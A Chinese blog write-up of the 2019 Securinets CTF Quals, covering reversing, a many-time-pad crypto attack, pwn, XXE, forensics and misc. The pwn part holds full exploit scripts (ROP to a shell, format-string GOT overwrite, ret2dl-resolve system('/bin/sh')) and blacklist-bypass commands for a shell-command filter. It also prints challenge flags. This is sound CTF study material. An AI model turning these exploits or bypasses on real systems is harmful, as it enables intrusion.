---
title: 2019-Securinets-CTF-Quals
date: 2019-03-25 08:45:10
tags: wp
---

比赛的时候做了四道题，顺便复现几道没做出来的题目。

![](/pics/2019-Securinets-CTF-Quals/1.png)

<!-- more -->

# Reversing

## AutomateMe

```bash
root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin
./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped
```

用 radare2 分析一下：

```
root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin
 -- Execute commands on a temporary offset by appending '@ offset' to your command.
[0x000005d0]> aaa
[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)
Invalid instruction of 16366 bytes at 0x124
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
...
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000005d0]> s main
[0x000006da]> pdf
Linear size differs too much from the bbsum, please use pdr instead.
[0x000006da]> pdr
Do you want to print 1316 lines? (y/N) y
...
| 0x00000786      3c68           cmp al, 0x68                          ; 'h'
| ; DATA XREF from main (+0x173d3)
| 0x00000788      7416           je 0x7a0
| ----------- true: 0x000007a0  false: 0x0000078a
| ; DATA XREF from main (+0x1742f)
| 0x0000078a      488d3de57c02.  lea rdi, str.nope_:                   ; 0x28476 ; "nope :( " ; const char *format
| ; DATA XREF from main (+0x1758d)
| 0x00000791      b800000000     mov eax, 0
| ; DATA XREF from main (+0x17681)
| 0x00000796      e815feffff     call sym.imp.printf                   ; int printf(const char *format)
| ; DATA XREF from main (+0x1776e)
| 0x0000079b      e9007c0200     jmp 0x283a0
...
```

在 `0x00000786` 处可以看到将输入的某个字符与 `h` 进行了比较。

```
...
| ----------- true: 0x000283a0
| ; CODE XREF from main (0x788)
| ; DATA XREF from main (+0x17869)
| 0x000007a0      488b45e0       mov rax, qword [s]
| ; DATA XREF from main (+0x17928)
| 0x000007a4      4883c008       add rax, 8
| ; DATA XREF from main (+0x179e7)
| 0x000007a8      488b00         mov rax, qword [rax]
| ; DATA XREF from main (+0x17a86)
| 0x000007ab      0fb64002       movzx eax, byte [rax + 2]             ; [0x2:1]=76
| ; DATA XREF from main (+0x17b4c)
| 0x000007af      8845ff         mov byte [local_1h], al
| ; DATA XREF from main (+0x17bdd)
| 0x000007b2      8075ffeb       xor byte [local_1h], 0xeb
| ; DATA XREF from main (+0x17ca3)
| 0x000007b6      807dff8e       cmp byte [local_1h], 0x8e
| ; DATA XREF from main (+0x17d70)
| 0x000007ba      7416           je 0x7d2
...
```

往下看变得复杂了一些，将输入和 `0xeb` 异或了一下再与 `0x8e` 比较，故这里的字符是 `chr(0xeb^0x8e)='e'`。

事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag：

![](/pics/2019-Securinets-CTF-Quals/2.png)

正则匹配：

```python
#!/usr/bin/env python
import re
with open('bin.c', 'rb') as f:
    txt = f.read()
    regex = re.compile(r'\'(.*)\'')
    # print regex.findall(txt)
    output = ''
    for c in regex.findall(txt):
        output += c
    print output
```

输出 flag：

```bash
$ ./solve.py | grep -E "flag|securinets"
... here is you flag securinets{automating_everything_is_the_new_future} ...
```

## Warmup: Welcome to securinets CTF!

```
root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmup
warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped
```

ltrace 一下，大概能看出做了什么：

```bash
root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmup
puts("Welcome to securinets quals CTF "...Welcome to securinets quals CTF :)
)                                                 = 35
printf("PASSCODE:")                                                                         = 9
fgets(PASSCODE:ABC123
"ABC123\n", 100, 0x7f6912b8aa00)                                                      = 0x55e762c220e0
strlen("ABC123\n")                                                                          = 7
...
malloc(137)                                                                                 = 0x55e763504a80
strlen("QUJDMTIzCgCA/gMAcP4AADhpAAABABBp"...)                                               = 136
...
strlen("QUJDMTIz")                                                                          = 8
strlen("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"...)                                               = 62
...
puts("NOPE :( "NOPE :(
)                                                                            = 9
exit(0 <no return ...>
+++ exited (status 0) +++
```

放进 ida 里看看 main 函数：

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int length; // eax
  _BOOL4 v4; // ebx
  int v5; // ebx
  int v6; // ebx
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // ebx
  int v11; // ebx
  int v12; // ebx
  int v13; // ebx
  int v14; // ebx
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  int v18; // ebx
  int v19; // ebx
  int v20; // ebx
  int v21; // ebx
  int v22; // ebx
  int v23; // ebx
  int v24; // ebx
  int v25; // ebx
  int v26; // ebx
  int v27; // ebx
  int i; // [rsp+8h] [rbp-1C8h]
  int j; // [rsp+Ch] [rbp-1C4h]
  char *s; // [rsp+18h] [rbp-1B8h]
  int v32[102]; // [rsp+20h] [rbp-1B0h]
  unsigned __int64 v33; // [rsp+1B8h] [rbp-18h]

  v33 = __readfsqword(0x28u);
  puts("Welcome to securinets quals CTF :)");
  printf("PASSCODE:", a2);
  fgets(passcode, 100, stdin);
  for ( i = 0; i < strlen(passcode); ++i )
    v32[i] = passcode[i];
  length = sub_89A(0x64u);
  s = (char *)malloc(length + 1);
  base64_encode((__int64)v32, 0x64u, (__int64)s);
  for ( j = 0; j < strlen(s) && s[j] != 'C'; ++j )
    base64_string[j] = s[j];
  base64_string[strlen(base64_string)] = 0;
  v4 = sub_B88(base64_string);
  v5 = (unsigned __int64)sub_C07(base64_string) + v4;
  v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5;
  v7 = (unsigned __int64)sub_E25(base64_string) + v6;
  v8 = (unsigned __int64)sub_C90(base64_string) + v7;
  v9 = (unsigned __int64)sub_CAD(base64_string) + v8;
  v10 = (unsigned __int64)sub_CDA(base64_string) + v9;
  v11 = (unsigned __int64)sub_DA8(base64_string) + v10;
  v12 = (unsigned __int64)sub_DF4(base64_string) + v11;
  v13 = (unsigned __int64)sub_E6E(base64_string) + v12;
  v14 = (unsigned __int64)sub_ECA(base64_string) + v13;
  v15 = (unsigned __int64)sub_EF7(base64_string) + v14;
  v16 = (unsigned __int64)sub_F53(base64_string) + v15;
  v17 = (unsigned __int64)sub_FAF(base64_string) + v16;
  v18 = (unsigned __int64)sub_E51(s) + v17;
  v19 = (unsigned __int64)sub_107E(base64_string) + v18;
  v20 = (unsigned __int64)sub_10AF(base64_string) + v19;
  v21 = (unsigned __int64)sub_10E0(base64_string) + v20;
  v22 = (unsigned __int64)sub_10FD(base64_string) + v21;
  v23 = (unsigned __int64)sub_112A(base64_string) + v22;
  v24 = (unsigned __int64)sub_11FB(base64_string) + v23;
  v25 = (unsigned __int64)sub_1234(base64_string) + v24;
  v26 = (unsigned __int64)sub_1287(base64_string) + v25;
  v27 = (unsigned __int64)sub_12B6(base64_string) + v26;
  if ( v27 + (unsigned int)sub_1309(base64_string) == 25 )
  {
    puts("Good job! u know what to do and submit!");
  }
  else
  {
    puts("NOPE :(");
    free(s);
  }
  return 0LL;
}
```

一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本：

```python
#!/usr/bin/env python
import base64

def pos(x,y):
    for i in range(len(y)):
        if y[i] == x:
            return i

table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
enc = [0] * 36
enc[0] = ord(table[28])
enc[3] = ord('j')
enc[4] = enc[0] + 1
enc[12] = enc[4] - 1
enc[22] = enc[4] - 1
enc[24] = enc[4] - 1
enc[1] = ord(table[54])
enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) >> 2) + 1])
enc[10] = enc[2]
enc[6] = enc[3] - 32
enc[7] = ord('p')
enc[11] = 48
enc[23] = 48
enc[35] = enc[11] + 9
enc[8] = enc[0] - 1
enc[27] = enc[4] + 2
enc[31] = enc[27]
enc[9] = enc[27] + 7
enc[25] = enc[27] + 7
enc[13] = enc[1] + 1
enc[17] = enc[1] + 1
enc[21] = enc[1] + 1
enc[15] = enc[7] + 3
enc[14] = enc[15] + 1
enc[19] = ord('z')
enc[34] = enc[0] - 33
enc[5] = 88
enc[20] = 88
enc[29] = 88
enc[33] = 88
enc[26] = 49
enc[16] = enc[9] - 32
enc[28] = enc[16]
enc[18] = enc[7] - 30
enc[30] = enc[18]
enc[32] = enc[4]

flag = ''
for i in enc:
    flag += chr(i)
flag = base64.b64decode(flag)
print 'flag:', flag
```

# Crypto

# Useless Admin

题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。

```json
{
  "cipher_list": ["1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940", "1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f", "1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d", "160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f", "1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c", "1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e", "1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347", "0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42", "160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542", "1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b", "1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40"],
  "cipher_flag": "1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b"
}
```

同时我找到了一篇 [2017 年 AlexCTF 中类似的 writeup](http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/)，用的是 github 上的一个 [attack 脚本](https://raw.githubusercontent.com/Jwomers/many-time-pad-attack/master/attack.py)。

```python
#!/usr/bin/env python
## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017
# @author intrd - http://dann.com.br/
# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)

import string
import collections
import sets, sys

# 11 unknown ciphertexts (in hex format), all encrpyted with the same key
c1 = '1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940'
c2 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f'
c3 = '1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d'
c4 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f'
c5 = '1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c'
c6 = '1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e'
c7 = '1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347'
c8 = '0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42'
c9 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542'
c10 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b'
c11 = '1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40'
ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]
# The target ciphertext we want to crack
target_cipher = '1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b'

# XORs two string
def strxor(a, b):     # xor two strings (trims the longer input)
    return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])

# To store the final key
final_key = [None]*300
# To store the positions we know are broken
known_key_positions = set()

# For each ciphertext
for current_index, ciphertext in enumerate(ciphers):
	counter = collections.Counter()
	# for each other ciphertext
	for index, ciphertext2 in enumerate(ciphers):
		if current_index != index: # don't xor a ciphertext with itself
			for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts
				# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)
				if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index
	knownSpaceIndexes = []

	# Loop through all positions where a space character was possible in the current_index cipher
	for ind, val in counter.items():
		# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!
		if val >= 7: knownSpaceIndexes.append(ind)
	#print knownSpaceIndexes # Shows all the positions where we now know the key!

	# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!
	xor_with_spaces = strxor(ciphertext.decode('hex'),' '*300)
	for index in knownSpaceIndexes:
		# Store the key's value at the correct position
		final_key[index] = xor_with_spaces[index].encode('hex')
		# Record that we known the key at this position
		known_key_positions.add(index)

# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)
final_key_hex = ''.join([val if val is not None else '00' for val in final_key])
# Xor the currently known key with the target cipher
output = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))

print "Fix this sentence:"
print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+"\n"

# WAIT.. MANUAL STEP HERE
# This output are printing a * if that character is not known yet
# fix the missing characters like this: "Let*M**k*ow if *o{*a" = "cure, Let Me know if you a"
# if is too hard, change the target_cipher to another one and try again
# and we have our key to fix the entire text!

#sys.exit(0) #comment and continue if u got a good key

#target_plaintext = "cure, Let Me know if you a"
target_plaintext = "i wanted to end the world, but i'll settle for ending yours."
print "Fixed:"
print target_plaintext+"\n"

key = strxor(target_cipher.decode('hex'),target_plaintext)

print "Decrypted msg:"
for cipher in ciphers:
	print strxor(cipher.decode('hex'),key)

print "\nPrivate key recovered: "+key+"\n"
```

具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个 [cli 工具](https://github.com/CameronLonsdale/MTP)，让还原 key 更简单，截图如下：

![](/pics/2019-Securinets-CTF-Quals/3.png)

# Pwn

## Welcome

给了个 ssh，然后无法执行 welcome 以及查看 flag.txt：

```shell
$ pwd
/home/welcome
$ whoami
welcome
$ ls -al
total 56
dr-xr-xr-x   2 welcome         welcome          4096 Mar 23 20:23 .
drwxr-xr-x  22 root            root             4096 Mar 24 10:18 ..
-rw-r--r--   1 root            root                0 Mar 25 02:13 .bash_history
-rw-r--r--   1 welcome         welcome             0 Mar 24 00:22 .bash_logout
-rw-r--r--   1 welcome         welcome             1 Mar 24 13:33 .bashrc
-rw-r--r--   1 welcome         welcome           655 May 16  2017 .profile
-r--------   1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
-r--------+  1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
-rw-r-----   1 root            root              175 Mar 23 12:27 welcome.c
-r-s--x---   1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
-rw-r--r--   1 root            root             1741 Mar 23 20:13 wrapper.c
```

wrapper 是可以执行的，源码也能查看，可以大致看看做了什么：

```cpp
/* author : Anis_Boss */
#include <stdio.h>



int search(char str[], char word[])
{
    int l, i, j;
    /*length of word */
   for (l = 0; word[l] != '\0'; l++);
    for (i = 0, j = 0; str[i] != '\0' && word[j] != '\0'; i++)
    {
        if (str[i] == word[j])
        {
            j++;
        }
        else
        {
            j = 0;
        }
    }
    if (j == l)
    {
        /* substring found */
        return (i - j);
    }
    else
    {
        return  - 1;
    }
}

int delete_word(char str[], char word[], int index)
{
    int i, l;
    /* length of word */
    for (l = 0; word[l] != '\0'; l++);

    for (i = index; str[i] != '\0'; i++)
    {
        str[i] = str[i + l + 1];
    }
}

void main(int argc, char* argv[])
{
char * blacklist[]={"cat","head","less","more","cp","man","scp","xxd","dd","od","python","perl","ruby","tac","rev","xz","tar","zip","gzip","mv","flag","txt","python","perl","vi","vim","nano","pico","awk","grep","egrep","echo","find","exec","eval","regexp","tail","head","less","cut","tr","pg","du","`","$","(",")","#","bzip2","cmp","split","paste","diff","fgrep","gawk","iconv","ln","most","open","print","read","{","}","sort","uniq","tee","wget","nc","hexdump","HOSTTYPE","$","arch","env","tmp","dev","shm","lock","run","var","snap","nano","read","readlink","zcat","tailf","zcmp","zdiff","zegrep","zdiff"};


 char str[80], word[50];
    int index;
    printf("Welcome to Securinets Quals CTF \o/ \n");
    printf("Enter string:\n");
    read(0,str,79);
for (int i=0;i<sizeof(blacklist)/sizeof(blacklist[0]);i++)
{
    index = search(str, blacklist[i]);

    if (index !=  - 1)
    {
        delete_word(str, blacklist[i], index);
    }

}
setreuid(geteuid(),geteuid());
close(0);
system(str);
}
```

我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式：

```bash
welcome@vps614257:~$ ./wrapper
Welcome to Securinets Quals CTF o/
Enter string:
catccat flagfflag.txtttxt
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```

进阶绕过方式，利用`*`通配：

```bash
welcome@vps614257:~$ ./wrapper
Welcome to Securinets Quals CTF o/
Enter string:
/bin/ca* fla*
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```

高级绕过方式，sed 正则匹配：

```bash
welcome@vps614257:~$ ./wrapper
Welcome to Securinets Quals CTF o/
Enter string:
sed '' fla*
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```

[官方给的 wp](https://github.com/AnisBoss/CTFs/tree/master/Securinets-CTF-QUALS-2019/welcome)：

```bash
welcome@vps614257:~$ ./wrapper
Welcome to Securinets Quals CTF o/
Enter string:
/lib64/ld-linux-x86-64.so.2 ./welcome
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```

## Baby one

```
$ checksec ./baby1
[*] '/Users/qianfei/Desktop/baby1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida 反编译出 main 函数：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-30h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  write(1, "Welcome to securinets Quals!\n", 0x1DuLL);
  return read(0, &buf, 0x12CuLL);
}
```

简单的 rop，利用 `__libc_csu_init` 来 call 函数，达到泄漏和 getshell。Exploit：

```python
#!/usr/bin/env python
from pwn import *
local = 0
if local:
	p = process('./baby1')
else:
	p = remote('51.254.114.246', 1111)
elf = ELF('./baby1')
read_plt = elf.plt['read']
write_plt = elf.plt['write']
read_got = elf.got['read']
write_got = elf.got['write']
main = elf.symbols['main']
# gdb.attach(p)
buf = 0x0602000-0x100

#  4006a0:       4c 89 ea                mov    rdx,r13
#  4006a3:       4c 89 f6                mov    rsi,r14
#  4006a6:       44 89 ff                mov    edi,r15d
#  4006a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  4006ad:       48 83 c3 01             add    rbx,0x1
#  4006b1:       48 39 eb                cmp    rbx,rbp
#  4006b4:       75 ea                   jne    4006a0 <__libc_csu_init+0x40>
#  4006b6:       48 83 c4 08             add    rsp,0x8
#  4006ba:       5b                      pop    rbx
#  4006bb:       5d                      pop    rbp
#  4006bc:       41 5c                   pop    r12
#  4006be:       41 5d                   pop    r13
#  4006c0:       41 5e                   pop    r14
#  4006c2:       41 5f                   pop    r15
#  4006c4:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, addr):
	payload = '\x00' * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + '\x00' * 56 + p64(addr)
	p.sendline(payload)

# payload = cyclic(500)
offset = 56
csu(0, 1, write_got, 8, write_got, 1, main)
write = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success('write = ' + hex(write))
write_offset = 0x0f72b0
libc_base = write - write_offset
success('libc_base = ' + hex(libc_base))

execve = libc_base + 0x0000000000cc770
system = libc_base + 0x045390
str_bin_sh = libc_base + 0x18cd57

csu(0, 1, read_got, 16, buf, 0, main)
p.send(p64(execve) + '/bin/sh\x00')

csu(0, 1, buf, 0, 0, buf + 8, main)

p.interactive()
```

## Simple

```bash
root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple
[*] '/root/ctf/2019-Securinets/pwn/Simple/simple'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida 反编译 main 函数：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-50h]
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  read(0, &buf, 0x3FuLL);
  printf(&buf, &buf);
  perror("hemm okay\n");
  return __readfsqword(0x28u) ^ v5;
}
```

在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit：

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
local = 1
if local:
	p = process('./simple')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	one_gadget_offset = 0x4f322
else:
	p = remote('51.254.114.246', 4444)
	libc = ELF('libc.so.6')
	one_gadget_offset = 0x4526a
elf = ELF('./simple')
main = elf.symbols['main']
perror_got = elf.got['perror']
read_got = elf.got['read']

payload = '%14$p%10$s%1682c%9$hn'
payload += '\x00' * (24 - len(payload))
payload += p64(perror_got)
payload += p64(read_got)
p.send(payload)

leak = p.recv()
offset = 0xd8
ret = int(leak[0:14], 16) - offset

read = u64(leak[14:20].ljust(8, '\x00'))
success('read = ' + hex(read))
libc_base = read - libc.symbols['read']
success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + one_gadget_offset

a0 = one_gadget & 0xffff
a1 = ((one_gadget & 0xffff0000) >> 16)
a1 = (a1 - a0 - 1) % 0x10000 + 1

payload = '%{}c%{}$hn'.format(a0, 10)
payload += '%{}c%{}$hn'.format(a1, 11)
payload += '\x00' * (32 - len(payload))
payload += p64(ret)
payload += p64(ret + 2)
p.sendline(payload)

payload = '%1430c%8$hn'
payload += '\x00' * (16 - len(payload))
payload += p64(perror_got)
p.sendline(payload)

p.interactive()
```

## Baby Two

```bash
$ checksec ./baby2
[*] '/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

ida 反编译 main 函数：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+8h] [ebp-30h]

  setvbuf(_bss_start, 0, 2, 0);
  return read(0, &buf, 0x12Cu);
}
```

只有一个 `read`，没有泄漏，那就是用 return-to-dl-runtime-resolve，构造 `.dynstr` 和 `.dynsym` 来获取 system。这道题应该是用 gcc-4.9 或者更高版本的编译的，溢出这边会用栈上的一个值通过 ecx 来存 esp 的值，直接溢出会让栈毁掉。办法是用 Off-by-One 的思路溢出最后 ecx 的最后一个字节来爆破。下面是不开 ASLR 的版本：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./baby2')
elf = ELF('./baby2')

buf = elf.symbols['useless'] # 0x804a040
plt0 = 0x8048320
pop3_ret = 0x08048509

# readelf -a ./baby2 | grep .dynamic
#   [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
dynamic = 0x08049f14
# readelf -a ./baby2 | grep .rel.plt
#   [10] .rel.plt          REL             080482d8 0002d8 000018 08  AI  5  24  4
relplt = 0x080482d8
# readelf -a ./baby2 | grep SYMTAB
#  0x00000006 (SYMTAB)                     0x80481d0
dynsym = 0x80481d0
# readelf -a ./baby2 | grep STRTAB
#  0x00000005 (STRTAB)                     0x8048240
dynstr = 0x8048240

#gdb.attach(p, 'b *0x80484a7\nc')

def read(addr, size): # addr=>+12 ; size=>+16
	return p32(read_plt) + p32(pop3_ret) + p32(0) + p32(addr) + p32(size)

reloc_arg = buf - relplt
payload = cyclic(100)
payload = (
	read(buf, 0x100) +
	p32(plt0) +
	p32(reloc_arg) +
	p32(0xdeadbeef) +
	p32(buf + 40) # &"/bin/sh\x00"
).ljust(44, '\x00')
payload += '\x9C' # overflow ecx
p.send(payload)

pause()

padding_size = 16 - ((buf + 8 - dynsym) % 16) # 8
payload = ( # buf
	# Elf32_Rel
	p32(buf) + # r_offset
	p32(0x7 | (((buf + 8 + padding_size - dynsym) / 16) << 8)) + # r_info
	'A' * padding_size + # padding
	# Elf32_Sym
	p32(buf + 32 - dynstr) + # st_name
	p32(0) + # st_value
	p32(0) + # st_size
	p32(0x12) + # st_info
	# buf+32
	'system\x00\x00' + '/bin/sh\x00'
)
p.sendline(payload)

p.interactive()
```

# Web

## Feedback

这是一道 XXE，通过 burpsuite 抓包，然后直接利用[网上的 exp](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)看到：

![](/pics/2019-Securinets-CTF-Quals/4.png)

然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag：

![](/pics/2019-Securinets-CTF-Quals/5.png)

发现没有，再试试 apche 根目录：

![](/pics/2019-Securinets-CTF-Quals/6.png)

还是不行。发现网站是 nginx 搭的，就 google 一下 [nginx 的默认 www 目录](https://stackoverflow.com/questions/10674867/nginx-default-public-www-location)：

![](/pics/2019-Securinets-CTF-Quals/7.png)

然后可以看到 root 的路径，尝试获得 flag：

![](/pics/2019-Securinets-CTF-Quals/8.png)

# Foren

## Easy Trade

用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key：

![](/pics/2019-Securinets-CTF-Quals/9.png)

![](/pics/2019-Securinets-CTF-Quals/10.png)

然后再往下看可以找到一个 PK 头的 zip，看得到里面有 `flag.txt`：

![](/pics/2019-Securinets-CTF-Quals/11.png)

拿到 `flag.txt` 的内容后 base64 解密一下拿到 flag：

```shell
$ cat data
securinetsXD

$ unzip flag.zip
Archive:  flag.zip
[flag.zip] flag.txt password:
 extracting: flag.txt

$ cat flag.txt | base64 -D
securinets{954f670cb291ec276b1a9ff8453ea60%
```

# Misc

## HIDDEN

题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https：

![](/pics/2019-Securinets-CTF-Quals/12.png)

